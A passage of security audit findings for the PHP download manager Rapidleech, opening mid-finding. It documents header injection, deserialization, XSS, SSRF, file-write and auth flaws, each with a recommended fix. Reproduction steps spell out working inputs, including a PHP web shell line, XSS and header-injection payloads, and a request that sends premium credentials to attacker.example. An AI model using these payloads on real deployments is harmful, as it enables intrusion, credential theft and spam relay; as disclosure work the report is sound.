classes/mail.php builds the From and other headers by string-concatenating user-supplied $from (lines 35, 42) without rejecting CR/LF. PHP's mail() will treat injected newlines as additional headers, allowing attackers to insert Bcc, Cc, Reply-To, and even craft a multi-recipient blast.

## Location
[classes/mail.php:35](https://github.com/PBhadoo/Rapidleech/blob/main/classes/mail.php#L35)

## Impact
Attacker can add Bcc/Cc/From headers, enabling spam relay or address spoofing.

## Reproduction steps
1. Caller passes from=`me@x.com\r\nBcc: target1@a.com,target2@b.com\r\n`. mail() interprets the newlines and silently adds the Bcc list, turning rapidleech into a spam relay.

## Recommended fix
Strip or reject any CR/LF in user-supplied address fields before building the headers.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Mail Header Injection
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Object injection via plugin cache files

## Details
hosts/download/youtube_com.php (lines 102, 276) and hosts/download/mega_co_nz.php (lines 524, 556) call unserialize() on the contents of cache files (YT_cookie.txt, YT_lastjs.txt, mega_dl.php) located inside the user-writable DOWNLOAD_DIR. An attacker who can write a file with the matching name (by submitting a download whose final filename collides) can plant a serialized payload that triggers gadgets on the next plugin run.

## Location
[hosts/download/youtube_com.php:102](https://github.com/PBhadoo/Rapidleech/blob/main/hosts/download/youtube_com.php#L102)

## Impact
Attacker who controls a downloaded filename triggers unserialize on plugin reload.

## Reproduction steps
1. Attacker submits a transload that lands in files/YT_cookie.txt with a serialized payload body. Next time the YouTube plugin runs it reads the file, unserializes the payload, and a __destruct/__wakeup/__toString chain fires.

## Recommended fix
Replace cache serialization with json_encode/json_decode; store cache files outside the public download directory.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Insecure Deserialization
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Setup wizard re-arms whenever options array shrinks

## Details
configs/setup.php re-runs when count($options) < count($default_options) or when configs/config.php is missing. Any deployment whose admin removed options to the file (e.g., trimming after an upgrade) re-enters the setup flow, which writes a new config.php from POST data via var_export at line 212+. The setup endpoint is not authenticated, so the first visitor after such an event becomes the admin and resets credentials.

## Location
[configs/setup.php:19](https://github.com/PBhadoo/Rapidleech/blob/main/configs/setup.php#L19)

## Impact
Visitor reinitialises configuration to defaults including admin/admin.

## Reproduction steps
1. After an upgrade where the maintainer removed entries, an attacker monitors the deployment and POSTs to setup.php, supplying admin_pass='attacker'. The server writes config.php with the attacker's password and the attacker logs in immediately afterwards.

## Recommended fix
Require existing admin credentials before re-running setup; never auto-trigger on count mismatches.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Improper Authentication (CWE-287)
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# auul.php cross-user upload of any victim's downloads

## Details
auul.php:155-156 unconditionally forces $options['show_all'] = true and $_COOKIE['showAll'] = 1, then calls _create_list() to enumerate every file in DOWNLOAD_DIR. The form posts each filename as base64-encoded $_POST['files'][]. Lines 35-41 then build $uploads[] = ['host' => $host, 'file' => DOWNLOAD_DIR . base64_decode($file)] with NO ownership comparison against USER_TOKEN. The user's iframe then opens upload.php?uploaded=<host>&filename=<base64> which reads the file via basename(base64_decode(...)) — basename strips path traversal but not the cross-user access. The premium credentials in configs/accounts.php for the upload host are used.

## Location
[auul.php:39](https://github.com/PBhadoo/Rapidleech/blob/main/auul.php#L39)

## Impact
Any user can upload another user's files to attacker-controlled hosts using operator's premium credentials.

## Reproduction steps
1. Attacker visits /auul.php, sees every other user's filenames, ticks the victim's private.zip, picks 'sendspace' as host. Server uploads private.zip via operator's premium sendspace account; attacker receives the public download link.

## Recommended fix
Reject auul.php requests for files where files.lst entry's owner != USER_TOKEN; remove the forced show_all=true override.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Improper Access Control
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# mrename action bypasses forbidden_filetypes check

## Details
mrename.php:41 checks in_array('.' . strtolower($_POST['extension']), $options['forbidden_filetypes']) — exact match. Setting extension='php.gif' yields '.php.gif' which is not in the blocklist. Line 43 then renames to fixfilename($file['name'] . ".{$_POST['extension']}"). On Apache configurations using AddHandler/AddType for .php, files like shell.php.gif execute as PHP because Apache scans every extension token (legacy MultiViews/AddType behavior, still enabled by default in many distributions). fixfilename's ../ regex is single-pass and bypassable with ....// → ../.

## Location
[classes/options/mrename.php:41](https://github.com/PBhadoo/Rapidleech/blob/main/classes/options/mrename.php#L41)

## Impact
User uploads PHP shell as e.g. shell.gif then renames to shell.php.gif; Apache executes as PHP.

## Reproduction steps
1. 1) Download or queue_add a file containing <?php system($_GET['c']); ?> as 'pic.gif'. 2) POST /index.php?act=mrename_go with files[0]=<idx>, yes=1, extension=php.gif. 3) File becomes pic.gif.php.gif. 4) Visit /files/pic.gif.php.gif?c=id — Apache executes as PHP.

## Recommended fix
Reject any extension containing '.' or matching any entry of forbidden_filetypes by suffix scan; or whitelist allowed extensions instead of blacklisting.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Improper Filter / Unrestricted File Upload
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Premium account credentials exfiltrated via host parameter spoofing

## Details
index.php:221-243 (and audl.php:178-188) match $_GET['host'] against $premium_acc[$site] and base64-encode the configured username:password into an Authorization: Basic header. The host of the actual download URL is not validated to match the host whose creds are loaded — attacker submits link=http://attacker.example/&host=fileboom.me&auth=1 and the server attaches the configured fileboom.me Basic Auth credentials when contacting attacker.example.

## Location
[index.php:221](https://github.com/PBhadoo/Rapidleech/blob/main/index.php#L221)

## Impact
Attacker submits link with host=premium-host parameter; server sends premium Basic Auth to attacker URL.

## Reproduction steps
1. Attacker registers attacker.example, configures it to log Authorization headers. Submits link=http://attacker.example/foo&host=fileboom.me&auth=1 to /index.php. RapidLeech sends Authorization: Basic <base64(fileboom_user:fileboom_pass)> to the attacker, exfiltrating premium credentials.

## Recommended fix
Verify that the destination URL's host matches the credentials' intended host before attaching the Authorization header.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Credential Leakage
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Reflected XSS in upload result page

## Details
upload.php builds an HTML page from $download_link/$delete_link/$stat_link and writes it to <file>.upload.html. The values are passed through htmlspecialchars() but without ENT_QUOTES, and they appear inside href attributes. If an upload plugin returns a 'javascript:' URL (or one with a single-quote attribute trick), it ends up in the persisted HTML and runs when the victim opens the file's upload page.

## Location
[upload.php:67](https://github.com/PBhadoo/Rapidleech/blob/main/upload.php#L67)

## Impact
Attacker-controlled upload-host response triggers stored XSS in the per-user upload.html

## Reproduction steps
1. A compromised or malicious upload host returns download_link='javascript:alert(document.cookie)'. The user opens upload.html and the script runs in the RapidLeech origin.

## Recommended fix
Validate that link values start with http:// or https:// before rendering, and encode with ENT_QUOTES.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** XSS
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Stored XSS via archive entry names in file listings

## Details
Archive entry names (RAR/ZIP/TAR) are surfaced in the file listing without consistent HTML escaping. Combined with the cross-user listing issue, a crafted archive name reaches another user's browser and executes script.

## Location
[classes/rar.php:204](https://github.com/PBhadoo/Rapidleech/blob/main/classes/rar.php#L204)

## Impact
Attacker-uploaded archive renders script in other users' browsers

## Reproduction steps
1. Attacker uploads a RAR with an entry named '<img src=x onerror=alert(1)>'. The admin's file listing renders the script.

## Recommended fix
htmlspecialchars(..., ENT_QUOTES, 'UTF-8') every archive entry name before rendering.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** XSS
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Admin GET endpoints disclose config and accounts

## Details
Admin actions like get_config, get_accounts return file contents over GET with no anti-CSRF or Origin check. With Basic-Auth cached the admin's browser leaks them on cross-site requests if response handling permits it (e.g., via JSONP-like endpoints or downloadable text).

## Location
[admin/index.php:200](https://github.com/PBhadoo/Rapidleech/blob/main/admin/index.php#L200)

## Impact
CSRF-like cross-origin reads exfiltrate Blowfish key and premium credentials

## Reproduction steps
1. Admin visits attacker.example which embeds <iframe src='/admin/index.php?action=get_accounts'>. With network access, contents are exfiltrated via XS-Leak primitives.

## Recommended fix
All admin reads should require POST with CSRF token; respond with X-Content-Type-Options: nosniff and a strict CSP that blocks framing.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Information Disclosure
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Parallel chunk filename collision

## Details
Chunk temporary files are named md5($url)-N. If two users download the same URL at the same time, their parallel chunks collide. One user's data overwrites the other's, and the merged file may be tampered with by the attacker who controls one of the sessions.

## Location
[classes/http.php:1200](https://github.com/PBhadoo/Rapidleech/blob/main/classes/http.php#L1200)

## Impact
Two simultaneous downloads of the same URL corrupt each other's data

## Reproduction steps
1. Attacker starts a download of URL X, then waits for victim to start the same URL. Attacker's chunks (with arbitrary content via a slow proxy) can be substituted into victim's merged file.

## Recommended fix
Include USER_TOKEN and a per-download UUID in the chunk filename; never share temp paths across users.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Logic
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Unserialize of file-stored records read from files.lst

## Details
purge_files() and other functions in classes/other.php and ajax.php call unserialize() on each line read from configs/files.lst. The contents are written by application code, but other vulnerabilities (file write primitives, SSRF that lets the attacker control content of a file written by queue_worker, or upload paths) can lead an attacker to influence bytes in files.lst. Once a malicious serialized object is on a line, every subsequent request that loads the file list (including the homepage) triggers unserialize() of attacker-controlled data and instantiates the gadget chain.

## Location
[classes/other.php](https://github.com/PBhadoo/Rapidleech/blob/main/classes/other.php)

## Impact
Attacker who can write into files.lst escalates to PHP object injection during normal operation

## Reproduction steps
1. Attacker uses the SSRF described elsewhere to fetch a payload that, when serialized into a file record, contains a forged record with newline injection. The crafted payload is written into files.lst. The next time any user loads the homepage, purge_files() unserialize()s it and the gadget fires.

## Recommended fix
Replace serialize/unserialize with json_encode/json_decode for files.lst. Validate and constrain values after decoding.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Insecure Deserialization
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# AJAX endpoints skip authentication even when login is enabled

## Details
ajax.php is whitelisted in the root .htaccess as a direct entry point but never calls login_check(). The function is the only auth gate the application defines for the front-end pages. As a consequence, every ajax sub-action — queue_add, queue_process, queue_status, pending_downloads, mega_queue_check, linkcheck and others — runs without checking the login cookie. Even when an operator sets $options['login'] = true to lock down the front end, the AJAX surface is still public, and any state-changing action exposed via AJAX (queue_add, kill_pid, etc.) is reachable.

## Location
[ajax.php:1](https://github.com/PBhadoo/Rapidleech/blob/main/ajax.php#L1)

## Impact
Authenticated-only features (queue management, pending downloads, link checking) are reachable by any unauthenticated client.

## Reproduction steps
1. Operator enables $options['login']=true with a strong username/password to keep the deployment private. Attacker discovers the public hostname and POSTs ajax=linkcheck with arbitrary URLs, or ajax=queue_add with attacker-chosen download URLs. The server processes them despite the login wall.

## Recommended fix
Apply the same authentication check used by other entry points to ajax.php so the login configuration option actually constrains every reachable endpoint. Treat any future entry point as private-by-default by centralizing the login gate in rl_init.php.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Authentication
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Reflected XSS via host parameter injected into JavaScript string literal

## Details
auul.php iterates $_POST['hosts'] without validating against the registered $upload_services list, then renders the value inside a `<script>` block as a JavaScript single-quoted string literal: `echo "\tlinks{$j}[".$i."]='".$link."';\n";` where $link contains the unescaped host value. No CSRF tokens. login=false default makes this unauthenticated.

## Location
[auul.php:113](https://github.com/PBhadoo/Rapidleech/blob/main/auul.php#L113)

## Impact
Cross-origin attacker executes JavaScript in any victim's session via the auto-upload endpoint.

## Reproduction steps
1. Attacker hosts a page with an auto-submitting form to /auul.php?action=upload with hosts[]=`';alert(document.cookie);'//`&files[]=<base64>&windows=1. When a victim opens the attacker page, the browser POSTs to RapidLeech and the rendered JS contains the breakout, executing arbitrary script in the RapidLeech origin.

## Recommended fix
Validate $_POST['hosts'] entries are members of $upload_services; HTML/JS-encode any reflected string (use json_encode for JS contexts); add CSRF tokens.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Cross-Site Scripting
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Reflected XSS via downloader error string in batch download endpoint

## Details
audl.php emits `echo "<script type='text/javascript'>updateStatus($i, '".addslashes($lastError)."');</script>$nn";`. addslashes() escapes only `'`, `"`, `\`, NUL — it does not escape `</script>`. If $lastError contains an attacker-controlled fragment (e.g., the upstream HTTP response body or URL fragment that the downloader plugin propagates into errors), the substring `</script><img src=x onerror=alert(1)>` closes the script context and executes arbitrary HTML.

## Location
[audl.php:222](https://github.com/PBhadoo/Rapidleech/blob/main/audl.php#L222)

## Impact
Cross-origin attacker executes JavaScript in any user's session via crafted upstream error.

## Reproduction steps
1. Attacker submits a download URL pointing at a server they control; the upstream returns an HTTP error body containing `</script><svg onload=alert(1)>`; audl.php reflects it into the page, where it renders as HTML and executes.

## Recommended fix
Use json_encode() for JS-string contexts; never rely on addslashes() in HTML/JS sinks.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Cross-Site Scripting
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Admin credentials compared with non-constant-time operator

## Details
Admin Basic Auth uses `$_SERVER['PHP_AUTH_USER'] !== $ADMIN_USER || $_SERVER['PHP_AUTH_PW'] !== $ADMIN_PASS`. The `!==` operator on strings short-circuits at the first differing byte, leaking matching-prefix length via timing. Practical exploitability over the network is limited by jitter, but the pattern is unsafe.

## Location
[admin/index.php:19](https://github.com/PBhadoo/Rapidleech/blob/main/admin/index.php#L19)

## Impact
Network attacker may distinguish password-prefix matches by response time.

## Reproduction steps
1. Attacker sends thousands of probes with varying prefixes and uses statistical analysis to recover the password byte by byte.

## Recommended fix
Replace with hash_equals($expected, $supplied).

---
**Severity:** LOW
**Status:** Open
**Category:** Cryptographic Issues
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Missing security response headers

## Details
rl_init sets X-Frame-Options: SAMEORIGIN and cache headers but does not emit Content-Security-Policy, X-Content-Type-Options, Referrer-Policy, or Permissions-Policy. Stored/reflected XSS findings above are easier to exploit without CSP.

## Location
[rl_init.php:44](https://github.com/PBhadoo/Rapidleech/blob/main/rl_init.php#L44)

## Impact
XSS exploitation is easier; clickjacking on non-admin pages

## Reproduction steps
1. An XSS payload runs without the constraints CSP would impose.

## Recommended fix
Add a strict CSP (default-src 'self'), X-Content-Type-Options: nosniff, Referrer-Policy: same-origin, and a minimal Permissions-Policy.

---
**Severity:** LOW
**Status:** Open
**Category:** Hardening
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# split.php and pack.php arbitrary file write outside download_dir

## Details
classes/options/split.php:67 sets $saveTo = ($options['download_dir_is_changeable'] ? stripslashes($_POST['saveTo'][$i]) : realpath(DOWNLOAD_DIR) . '/'). When download_dir_is_changeable=true, $saveTo accepts arbitrary attacker-supplied paths with no realpath containment. Subsequent fopen($saveTo . $partName, 'wb') writes to /var/www/html/, /etc/cron.d/, or any path the web user has write access to. classes/options/pack.php:49 has the identical pattern.

## Location
[classes/options/split.php:67](https://github.com/PBhadoo/Rapidleech/blob/main/classes/options/split.php#L67)

## Impact
User writes split parts / tar archives to any path the web user can write, when download_dir_is_changeable is enabled.

## Reproduction steps
1. With download_dir_is_changeable=true: POST /index.php?act=split_go with files[0]=<idx>&partSize[0]=1&saveTo[0]=/var/www/html/&crc_mode[0]=fake — split parts written into webroot. If the source file content is attacker-controlled (downloaded earlier), .001 part contains arbitrary bytes inside webroot.

## Recommended fix
Always anchor $saveTo with realpath() and verify it starts with realpath(DOWNLOAD_DIR); reject paths with .. components.

---
**Severity:** LOW
**Status:** Open
**Category:** Arbitrary File Write
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Attacker-controlled myuploads.txt content via base64 save_style

## Details
After a successful upload step, upload.php does file_put_contents(DOWNLOAD_DIR.'myuploads.txt', "$save_style\r\n", FILE_APPEND|LOCK_EX). $save_style derives from base64_decode($_GET['save_style']) with only {link}/{name}/\n/{size}/{sizeb} substituted; the rest is attacker-controlled. The file is web-accessible from /files/myuploads.txt and templates link to it. Although the .txt extension prevents PHP execution, attackers can inject arbitrary text — useful for fake download links, phishing content, or HTML rendered by clients that mis-sniff content-type.

## Location
[upload.php:91](https://github.com/PBhadoo/Rapidleech/blob/main/upload.php#L91)

## Impact
Anyone appends arbitrary attacker-controlled text/links to a publicly served file.

## Reproduction steps
1. Attacker submits an upload via auul/upload with save_style=base64('<html><script>...</script></html>'); subsequent visitors fetching /files/myuploads.txt see attacker content; if rendered as HTML by a misconfigured browser/MIME, JS executes.

## Recommended fix
Drop save_style (server-side only template); or strictly validate it as a fixed enum; serve myuploads.txt with X-Content-Type-Options: nosniff.

---
**Severity:** LOW
**Status:** Open
**Category:** Stored Content Injection
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Server-side request forgery via Host header in queue trigger

## Details
ajax.php queue_process and queue_worker.php (line 317) construct `$processUrl = $protocol . '://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . '/queue_worker.php?id=' . $next['id'];` and pass it to curl_init(). Apache by default forwards arbitrary Host headers into HTTP_HOST. The cURL call has no body, no cookies, no follow-location, but does perform the GET with a 1s timeout. While limited (no exfiltration channel), it provides a blind SSRF probe for internal-network reachability and amplifies attacks on misconfigured load balancers.

## Location
[ajax.php:551](https://github.com/PBhadoo/Rapidleech/blob/main/ajax.php#L551)

## Impact
Attacker forces server to make blind GET to a host they choose via Host header.

## Reproduction steps
1. Attacker sends `GET /ajax.php?ajax=queue_process` with `Host: 127.0.0.1:6379` (or an internal admin panel). Server initiates a blind GET; an attacker with side-channel timing or follow-on observation may infer reachability.

## Recommended fix
Use a configured base URL instead of HTTP_HOST; or validate Host against an allowlist before interpolating; restrict CURLOPT_PROTOCOLS to HTTPS.

---
**Severity:** LOW
**Status:** Open
**Category:** SSRF
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Reflected XSS via unescaped cookie values in legacy template

## Details
templates/neatblue/main.php emits `<input ... value="<?php echo $_COOKIE['email']; ?>" />` for several cookie names (email, proxy, proxyuser, proxypass, path) without htmlspecialchars. The flavor template has the equivalent escaping; this template was missed during the migration. Combined with the cookie-not-Secure issue, an MITM attacker on plain HTTP can plant a cookie and trigger XSS.

## Location
[templates/neatblue/main.php:150](https://github.com/PBhadoo/Rapidleech/blob/main/templates/neatblue/main.php#L150)

## Impact
Attacker who plants a victim cookie executes JavaScript on next page load.

## Reproduction steps
1. Attacker on shared network sets victim's `proxy` cookie to `"><script>alert(1)</script>` via plain-HTTP injection; victim later loads the neatblue template and the script runs.

## Recommended fix
Wrap all cookie reflections with htmlspecialchars(..., ENT_QUOTES, 'UTF-8'); audit all templates for parity.

---
**Severity:** LOW
**Status:** Open
**Category:** Cross-Site Scripting
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Linkchecker SSRF when checker.php is enabled

## Details
linkchecker.php::curl() accepts an arbitrary $link, follows redirects, and disables TLS verification. checker.php is denied by the shipped .htaccess but operators are encouraged to enable it for the link-check feature. Once enabled, the link parameter accepts any URL with no host filter; while only a status code/flag is returned (not response body), error-message timing leaks reachability of internal targets.

## Location
[classes/linkchecker.php:62](https://github.com/PBhadoo/Rapidleech/blob/main/classes/linkchecker.php#L62)

## Impact
Authenticated/anonymous (depending on enablement) attacker probes internal HTTP services.

## Reproduction steps
1. Operator uncomments checker.php in .htaccess. Attacker sends checker.php?link=http://10.0.0.1:8080/admin and uses response-time/error differential to enumerate the internal network.

## Recommended fix
Resolve and reject private/loopback IP ranges before fetching; re-enable TLS verification.

---
**Severity:** LOW
**Status:** Open
**Category:** SSRF
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Admin kill_pid sends signals to arbitrary system processes

## Details
kill_pid accepts any integer >1 from $_GET['kill_pid'] and shells out `kill -9 <pid>` (or taskkill on Windows) before verifying the PID belongs to a tracked download. An admin (or a CSRF victim admin) can kill unrelated processes — useful for disrupting other web apps colocated under the same web user.

## Location
[admin/index.php:190](https://github.com/PBhadoo/Rapidleech/blob/main/admin/index.php#L190)

## Impact
Authenticated attacker terminates any process the web user can signal.

## Reproduction steps
1. Authenticated admin (default admin/admin) or CSRF-induced session sends GET /admin/?action=kill_pid&kill_pid=1234, terminating an unrelated process owned by www-data.

## Recommended fix
Look up the PID in downloads.lst; only kill if it matches an active tracked download; use posix_kill with non-zero verification.

---
**Severity:** LOW
**Status:** Open
**Category:** Authorization
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02

---

# Unverified curl-pipe-shell installer for deno

## Details
install_deno (admin/index.php:325-348) executes `shell_exec("curl -fsSL https://deno.land/install.sh | sh")` with no GPG verification, no hash pinning, and no sandboxing. Compromise of deno.land or an MITM (especially given CURLOPT_SSL_VERIFYPEER is disabled elsewhere — and curl uses the system CA, but a hijacked CDN still wins) results in arbitrary code execution on the server.

## Location
[admin/index.php:332](https://github.com/PBhadoo/Rapidleech/blob/main/admin/index.php#L332)

## Impact
Server runs unsigned remote script — supply-chain compromise yields RCE.

## Reproduction steps
1. deno.land is compromised or DNS-hijacked; the next admin who clicks 'Install Deno' downloads a backdoored installer that runs as the web server user.

## Recommended fix
Pin to a specific version and verify the binary's sha256 hash (and GPG signature) before executing; or distribute via the OS package manager.

---
**Severity:** LOW
**Status:** Open
**Category:** Supply Chain / Insecure Deserialization
**Repository:** PBhadoo/Rapidleech
**Branch:** main
**Date created:** 2026-05-02